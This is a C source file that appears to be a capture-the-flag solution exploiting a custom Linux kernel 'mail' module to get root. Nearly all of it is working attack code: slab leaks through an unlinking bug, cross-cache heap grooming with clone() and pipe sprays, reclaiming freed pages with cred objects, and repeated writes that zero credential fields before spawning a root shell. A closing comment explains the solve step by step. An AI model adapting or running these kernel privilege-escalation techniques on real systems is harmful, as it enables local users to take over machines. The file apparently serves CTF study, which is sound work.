// clang-format off

#define _GNU_SOURCE
#include "mail_interface.c"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sched.h>
#include <sys/wait.h>
#include <pthread.h>
#include <sys/shm.h>

uint64_t POP_RDI = 0x6f35d;
uint64_t INIT_CRED = 0x1a52ae0;
uint64_t COMMIT_CREDS = 0xc0610;
uint64_t KERNEL_BASE  = 0xffffffff81000000;
uint64_t PHYSMAP_BASE = 0xffff888000000000;
uint64_t VMEMMAP_BASE = 0xffffea0000000000;

# define GETAFF 203

// PRETTY PRINTER FOR KERNEL :D
void show(void **buf, int size) {
  if(buf == NULL) { 
    puts("[x] Tried dumping invalid pointer");
    return;
  }
  
  printf(" ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\n");
  for (int i = 0; i < size; i += 0x8)
    printf("▕ 0x%-3x ▕ %-25p ▕\n", i, buf[(i / 8)]);
  printf(" ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n");
}

void pin(int core){
	cpu_set_t cpu;
  CPU_ZERO(&cpu);
  CPU_SET(core, &cpu);
  syscall(GETAFF,0, sizeof(cpu_set_t), &cpu);
}


/* Who does not like some init() calls */
void init() {
  setvbuf(stdin,0,2,0);
  setvbuf(stdout,0,2,0);
}

/*
  >> [Setup functions] 
===============================================
*/  

void logne(char *str) {
  printf("[x] %s\n",str);
}

#define STAGE1_WHEREPROC 1
#define STAGE2_FOUNDPROC 2
#define STAGE3_CREDWRITE 3
#define STAGE3_SPAWNSHEL 4

int shmid;
long *shmem;

char *argc[3] = { "/bin/sh",NULL };
char *argv[3] = { NULL };

/* Try to get the shell */
void try_shell() {
      pin(1);
      while(1) {
        if (*shmem == STAGE1_WHEREPROC) {
          if(getuid() != 0x3e8) {
            *shmem = STAGE2_FOUNDPROC;
            // This process is the GUY
            while (*shmem == STAGE2_FOUNDPROC) {
              // Begin communicating to check LSB
              shmem[1] = getuid();
              shmem[2] = 1;

              while (shmem[2]);
          }
          while(*shmem != STAGE3_SPAWNSHEL) {}
          printf("[+] UID = %d\n",getuid());
          printf("[+] Trying shell\n");
          setuid(0);
          execve("/bin/sh",argc,argv);
      } // Other processes can go now 
        if (*shmem == STAGE2_FOUNDPROC) exit(-1); 
    }
  }
}

#define PK 0xdeadb000 
#define SK 0x13370000

#define NUMBOX   0x80
#define TMPBUF   0x2000
#define SUBTRANS 0x2

# define ALLMAIL 0x1000
# define REGMAIL 0x2000

unsigned box_arr[NUMBOX];
char     tmp_arr[TMPBUF];
size_t errormsg;

int subs[SUBTRANS][2] = {
  {1,2},
  {1,2},
};

/* Initialize all mailboxes that can ever be needed */
void init_mailboxes() {
  for (int i=0;i<NUMBOX;i++) {
    box_arr[i] = open_mailbox();
    if (box_arr[i] < 0) {
      logne("COULD NOT OPEN MAILBOX");
    } 
    int res = init_box(box_arr[i],PK+i,SK+i);
    if(res < 0) {
      printf("[+] COULD NOT INITIALISE BOX %d %x",res,res);
    }
  } puts("[+] Initialized mailboxes");
}

/* Helpers to handle miscellaneous tasks such as keys */
/* We only care about heap allocations and boxes for that matter */

int submailbox(int box1,int box2) {
    return sub_mailbox(box_arr[box1],PK+box2,SK+box2);
}

int unsubmailbox(int box1,int box2) {
    return unsub_mailbox(box_arr[box1],PK+box2,SK+box2);
}

int setboxstats (int box,int status,int maxsubs) {
    return set_box_status(box_arr[box],status,maxsubs);
}

int getboxstats (int box,usrstat *ctx) {
    return get_box_status(box_arr[box],ctx);
}

int sendmail_from_box(int box1,int box2,int flags,int size,void *buf) {
    usrmail *mail;
    int res;
    mail = malloc(size+sizeof(usrmail));
    mail->flags = flags;
    mail->size       = size;
    mail->secret_key = SK+box2;
    mail->public_key = PK+box2;
    memcpy(mail->data,buf,mail->size);
    mail->data[mail->size] = '\0';
    res = sendmail(box_arr[box1],mail);
    free(mail);
    if (res < 0) {
      errormsg = -res;
    } return res;
}

usrmail *recvmailfrag(int box1,int type,int exp_size) {
  usrmail *mail;
  mail = malloc(exp_size+sizeof(usrmail));
  mail->flags = type;
  memset(mail,'\0',exp_size+sizeof(usrmail));
  int res = recvmail(box_arr[box1],mail);
  if (res) {
      errormsg = -res;
      return NULL;
    
  } return mail;
}

void sendspam(int box1,int box2,int num,int type,int size) {

  char *buf = calloc(1,size);
  for (int i=0;i<num;i++) {
    sendmail_from_box(box1,box2,type,size,buf);
  }
}

int readspam(int box,int largest_msg_sz) {
  void *ptr = malloc(largest_msg_sz + 0x100);
  int nmsgs = 0;
  int retval = 0;
  while(retval >= 0) {
    retval = recvmail(box_arr[box],ptr);
    nmsgs++;
  } 
  
  free(ptr);
  return nmsgs;
  
}

// ==============================================================
// [ EXPLOIT PARAMETERS ]

#define OBJS_P_SLAB 15
#define LEAK_NMAILS 10
#define CPU_PARTIAL 52
#define MAX_NUM     10
#define ROTATE      0x1
#define NOROTATE    0x0
#define NUM_PROC    0x100

/* This is supposed to do the following : 
      1. create a set of bcast mail loops
      2. do the subscription and unsubscription loops
*/
void do_bcastmail_setup (int r1,int r2,int start,int wnum,int sz,char *buf) {

  usrstat x;

  // let the reader 1 sub to a lot of mailboxes and recieve 1 bcast mail
  for (int i=start;i<(start+OBJS_P_SLAB);i++) {
    submailbox(r1,i);
    sendmail_from_box(i,r1,BROADCAST_MAIL,sz,buf);
    unsubmailbox(r1,i);
  } 
  
  puts("[+] Filling Initial 3 slabs and releasing it back");
  sendspam(0,1,10,REGULAR_MAIL,0x900);
  int xx = readspam(1,0x900);
  printf("[+] Freed %d Slots\n",xx); 

  // Allocate 3 slabs and free them so that we have a lot of fields filled in slab
  // // let the reader 1 unsubscribe and reader 2 sub to mailboxes
  // // and recieve one bcast mail from writers
  puts("[+] Triggering unlink events : beware");
  for (int i=start;i<(start+OBJS_P_SLAB);i++) { 
    submailbox(r2,i);
    sendmail_from_box(i,r2,BROADCAST_MAIL,0x200,buf);
    // getboxstats(r2,&x);
    // showstats(&x);
    unsubmailbox(r2,i);
  } 

}

uint64_t slab_leak;
uint64_t slab_aligned;

uint64_t leak_mail_slab() {

    usrstat x;
    int sz = 0x400;
    usrmail *mail2 = NULL;

    memset(tmp_arr,0x61,sz);

    // Allocate 2 slabs worth bcastmail objects 
    do_bcastmail_setup(3,4,5,LEAK_NMAILS,sz,tmp_arr);
    puts("[+] Completed broadcast mail setup");

    // Try and retrieve kernel address from the heap 
    // Free and occupy and as we have unitialised fields in our data one of 
    // The buffers will have the kernel address `hopefully`
    for (int i=0;i<LEAK_NMAILS;i++) {
      usrmail *mail = recvmailfrag(4,ALLMAIL,sz);
      sendspam(0,1,1,REGULAR_MAIL,0x200);
    }

    // Scrounging for kernel leaks 0_0
    for (int i=0;i<LEAK_NMAILS;i++) {
      mail2 = recvmailfrag(1,ALLMAIL,0x200);
      if((*((uint64_t *)mail2->data + 1) != 0))
          slab_leak = *((uint64_t *)mail2->data + 1);
      free(mail2);
    }

    if (slab_leak != 0)
      printf("[+] Got allocator slab leak %p\n",(void *)slab_leak);

    // Exhaust list of box 3 to free up the slabs
    readspam(1,0x900);
    readspam(3,0x900);
    readspam(4,0x900);
    readspam(0,0x900);
    return 0;

}

/* 
   This is just to make sure we have the exact 
   start of the slab to not end up bruting offsets in cred 
*/
void calc_slab_base_ptr() {
  switch(slab_leak & 0Xff) {
      case  0x00: slab_aligned = slab_leak - 0x0000; break;
      case  0x08: slab_aligned = slab_leak - 0x0808; break;                                
      case  0x10: slab_aligned = slab_leak - 0x1010; break;      
      case  0x18: slab_aligned = slab_leak - 0x1818; break;
      case  0x20: slab_aligned = slab_leak - 0x2020; break;
      case  0x28: slab_aligned = slab_leak - 0x2828; break;
      case  0x30: slab_aligned = slab_leak - 0x3030; break;
      case  0x38: slab_aligned = slab_leak - 0x3838; break;
      case  0x40: slab_aligned = slab_leak - 0x4040; break;
      case  0x48: slab_aligned = slab_leak - 0x4848; break;
      case  0x50: slab_aligned = slab_leak - 0x5050; break;
      case  0x58: slab_aligned = slab_leak - 0x5858; break;
      case  0x60: slab_aligned = slab_leak - 0x6060; break;
      case  0x68: slab_aligned = slab_leak - 0x6868; break;
      case  0x70: slab_aligned = slab_leak - 0x7070; break;
      case  0x78: slab_aligned = slab_leak - 0x7878; break;
      case  0x80: slab_aligned = slab_leak - 0x8080; break;
      case  0x88: slab_aligned = slab_leak - 0x8888; break;
      case  0x90: slab_aligned = slab_leak - 0x9090; break;
      case  0x98: slab_aligned = slab_leak - 0x9898; break;
      case  0xa0: slab_aligned = slab_leak - 0xa0a0; break;
      case  0xa8: slab_aligned = slab_leak - 0xa8a8; break;
  }
  printf("[+] Obtained a Slab base pointer -> %p\n",(void *)slab_aligned);
}

// Borrowed this from willsroot blog on 6 byte overflow to attacking cred :) you should read it 
__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest)
{
    asm(".intel_syntax noprefix;"
        "mov r15, rsi;"
        "xor rsi, rsi;"
        "xor rdx, rdx;"
        "xor r10, r10;"
        "xor r9, r9;"
        "mov rax, 56;"
        "syscall;"
        "cmp rax, 0;"
        "jl bad_end;"
        "jg good_end;"
        "jmp r15;"
        "bad_end:"
        "neg rax;"
        "ret;"
        "good_end:"
        "ret;"
        ".att_syntax;");
}

__attribute__((naked)) void try_again()
{
    asm(".intel_syntax noprefix;"
    "try_again:"
        "jmp try_again;"
        ".att_syntax;");
}

/* Just for debugging */
void pausec(char *str) {
  char buf[0x100];
  printf("\n[+] %s : ",str);
  scanf("%s",buf);
}

int pipe_desc[0x200][2];

// We can use the fact that it is an isolated 
// cache to cross cache much easily and precisely 
int cross_cache() {
  char buf[0x10];
  // Fill up the holes 
  // [+] Step 1 : Exhaust all lists 
  for (int i=0;i<(30);i++) {
    for (int j=0;j<OBJS_P_SLAB;j++) {
      sendspam(1,2 + i,1,REGULAR_MAIL,0x100);
    }
  }

  // [+] Step 2 : Put all of them in the cpu_partial list by freeing them
  // and cpu partial list overflows and we cross the cache boundary
  for (int i=0;i<(30);i++) {
      if (i == 1)
        continue;
      if (i == 7) 
        readspam(3,0x900);
      //   continue;
      readspam(2 + i,0x900);

  }

}

char buf[0x1000];
long cur_idx = 10;
int write_init = 0;

/*
  This is our arbitrary pointer write primitive 
  addr => Where to write to
  rotate => rotate linked list ? <still kinda does not work>
  State => state to be used to do it
*/
long try_write(long addr,int rotate,int state) {
  
  // Just a bunch of box indexes for uniformity
  int r1    = 10;
  int r2    = 11;
  int r3    = 12;
  int f1  = 0x7d;
  int f2  = 0x7e;
  int start = 12;
  int sz = 0x300;
    
  if (write_init) {

try_writing:
    memset(buf,0,0x800);

    // Fill off the first slab with bcast mails 
    for (int i=start;i<(start + OBJS_P_SLAB);i++) {
      submailbox(r1,i);
      sendmail_from_box(i,r1,BROADCAST_MAIL,sz,buf);
      unsubmailbox(r1,i);
    }

    // Make sure that only one write happens and we control its state
    for (int i=start;i<(start+ (OBJS_P_SLAB/2));i++) { 
      if(rotate) {
        if (i == start) {
          sendmail_from_box(r1,f2,REGULAR_MAIL,sz,buf);
        } else if (i == (start + ((OBJS_P_SLAB/2) - 1))) {
          readspam(f2,0x900);
        }
    }
      
        
      if (state == (i - start))
            ((long *)((void *)buf + 0x7c0))[0x0] = (addr - 0x50);
      else if (state == (i - start - 1)) {
        ((long *)((void *)buf + 0x7c0))[0x0] = 0x0;
      } 
      
      sendmail_from_box(i,r3,REGULAR_MAIL,0x900,buf); 
    } readspam(r3,0x900);

    // Pull off the bcast mail setup so that we can unlink and write custom addr
    for (int i=start;i<(start+OBJS_P_SLAB);i++) {
      submailbox(r2,i);
      sendmail_from_box(i,r2,BROADCAST_MAIL,sz,buf);
      unsubmailbox(r2,i);
    }

    // Pull off the unlink to write to the task_struct the address of a bcast mail_head
    usrmail *mail;
    for (int i=0;i<OBJS_P_SLAB;i++) {
      mail = recvmailfrag(r2,ALLMAIL,0x900);
      free(mail);
    }

    for (int i=start;i<(start+OBJS_P_SLAB);i++) {
      readspam(i,0x900);
    } readspam(r1,0x900);

    if (cur_idx > 0x7d) {
      return 1;
    } 

    // >> DOING ROTATIONS OF ACTIVE SLAB (to keep target same)
    // =================================================================
    // Fill odd/ even places with address to write at

    for (int i=start;i<(start+OBJS_P_SLAB+1);i++) { 
      sendmail_from_box(i,f1,REGULAR_MAIL,sz,buf); 
    } 
    
    // our target slab is put on head of the freelist not the active slab
    readspam(f1,sz);
    return 0;

  } 

  // Keep one set of broadcast mails to be present at all times
  // so that fd and bk dont become the same and unlink null ptr deref occurs 
  for (int i=start;i<(start + OBJS_P_SLAB);i++) {
    submailbox(0x7f,i);
    sendmail_from_box(i,0x7f,BROADCAST_MAIL,sz,buf);
    unsubmailbox(0x7f,i);
  } goto try_writing;

}

pthread_t threads[0x30];
long pipe_page = 0;

int main() {

  usrstat stat;
  init();
  pin(0);

  // part 0 : Initialize mailboxes to start communication
  // ======================================================================
  init_mailboxes();

  // part 1 : Getting heap leaks through 
  //          the unlink write 
  // ======================================================================
  leak_mail_slab();
  calc_slab_base_ptr();

  // part 2 : Keep the address in mind and cross cache
  //          objs per slab = 15
  // ======================================================================
  cross_cache();

  // part 3 : Reclaim pages through cross cache and obtain writes
  //          [PREFERRABLE THESE OBJECTS]
  //          >> page order = 3
  //          - split it 
  //          - pipe_buf
  //          - cred_jar
  // ======================================================================
  /* Break down some initial order 3 pages we would have freed previously */ 

  usleep(1000);
  #define STACK_SIZE 1024 * 1024
  for (int i=0;i<MAX_NUM;i++) {
      __clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, &try_again);
  } usleep(1000);

  // part 3.5 : Create a shit tonne of pipe_bufs so that we 
  //            can find our page and reduce the noise by being sure
  // ======================================================================

  for (int i=0;i<100;i++) {
    pipe(&pipe_desc[i][0]);
  }
  
  for (int i=0;i<100;i++) {
    memset(buf,0x61,0x10);
    buf[0x100] = 0;
    write(pipe_desc[i][1],buf,0x20);
  }

  // We can assume one of them 
  // Now we do an unlink and check all the pipes to find our page
  // ======================================================================

  try_write(slab_aligned + 0x8,ROTATE,0);  // Just does unlink

  int found = 0;
  for (int i=0;i<100;i++) {
    read(pipe_desc[i][0],buf,0x20);
    if (((long *)(buf))[1] != 0x6161616161616161) {
      pipe_page = i;
      printf("[+] Found pipe %p at %d\n",((long **)(buf))[1],i);
      found = 1;
      break;
    }
  } if (!found) {
    printf("[+] Kinda cooked might as well ditch and give you another chance\n");
    exit(-1);
  }

  // part 4 : Free it and reoccupy it with cred 
  // ======================================================================
  // Try and release the page and a few others back to buddy allocator

  close(pipe_desc[pipe_page][0]);
  close(pipe_desc[pipe_page][1]);

  // Free a few pipes alongside to compensate for noise
  for (int i=0;i<=5;i++) {
    close(pipe_desc[i][0]);
    close(pipe_desc[i][1]);
  } usleep(1000);

  // Spray to fill up cred_jar and let it do page_alloc();
  for (int i=0;i<0x100;i++) {
    setuid(0);
  }

  printf("[+] Occupied the page with cred objects\n");

  // part 4.5 : Fork and reclaim and wait for uid change to try shell
  // ======================================================================

  shmid = shmget(IPC_PRIVATE, 0x1000, 0777|IPC_CREAT);
  shmem = shmat(shmid, NULL, 0);
  *shmem = 0;

  for (int i=0;i<NUM_PROC;i++) {
    if(!fork()) {
      try_shell();
    }
  }  

  // part 4.75 Figure out how to write null bytes | despite freelist-random
  // ======================================================================
  try_write(slab_aligned + 0x8,ROTATE,0);

  // Wait for the process to respond saying its uid was changed
  *shmem = STAGE1_WHEREPROC;
  while (*shmem == STAGE1_WHEREPROC) {
    continue;
  } 

  printf("[+] Found the required process\n");

  int state = 0;
  long lsbyt = 0;
  int rotate = NOROTATE;

try_rotate:
  // Finding the state for a null byte in the least significant byte
  for (int i=0;i<0x7;i++) {
    try_write(slab_aligned + 0x8,rotate,i);
    
    shmem[2] = 0;
    lsbyt = shmem[1];
    while(!shmem[2]);
    printf("[+] Trying for %d got %lx\n",i,lsbyt);
    if ((lsbyt & 0xff) == 0) {
      // This means we found the null byte page
      *shmem = STAGE3_CREDWRITE;
      if (i == 0)
        state = 0;
      state = i - 1;
      shmem[2] = 0;
      goto overwrite_cred;
    }
  } 

  // If we reached here that means initial method failed
  // rotate the list and try for the same
  if (rotate == NOROTATE) {
    rotate = ROTATE;
    goto try_rotate;
  }

  printf("[+] We could not find the page\n");
  exit(-1);

overwrite_cred:

  // part 5 : Nulls out cred so that we can spawn shell
  // ======================================================================
  for (int i=0;i<0x28;i++) {
    try_write((slab_aligned + 0x8) + i,rotate,state);
  }

  *shmem = STAGE3_SPAWNSHEL;
  // Just keep looping hopefully stuff worked :P 
  printf("[+] Looping until no return\n");
  while(1) {
    continue;
  }
  
}


/*
Intended solve : 
  1. BUG >> broadcast mailing list sets mail_head->lhead even if lhead is not initialised
     Since unlink happens for bmailinglist from in between too, while unlink happens 
     in regular mails in a FIFO manner. 
  2. This gives you an arbitrary write of a pointer which points to your next mail
  3. Since the regular mails and broadcast mails differ in size, you can write the broadcast
     mail pointer to the unitialised lhead field. This lets you leak out the pointer 
     by putting it into your payload while unlinking.
  4. Now you have kernel heap leak. With this you can cross cache and you will know the
     address of the page which you are leaking and thus you can write to that page through
     the same unlink primitive. But you can still only write the address of your next mail in 
     the box.
  5. Through cross cache you can do many things, but what I used is a lot of calls to clone()
     so that it can break down the order 3 pages to order 0 and then consume many order 0 pages
     with a bunch of pipe() calls. Then unlink write on the pipe to figure out which was our page
     after which we can release and reclaim it using setuid() calls into the cred struct.
  6. Find the address that has a null byte through identifying and rotating the freelists.
  7. Do a bunch of unlinks and null out the uid gid, fsuid etc, and finally make sure your address
     exists only in the cred->cap_inheritable and securebits field. and pray it does not screw it up.
  8. spawn a shell :) and you are root.
*/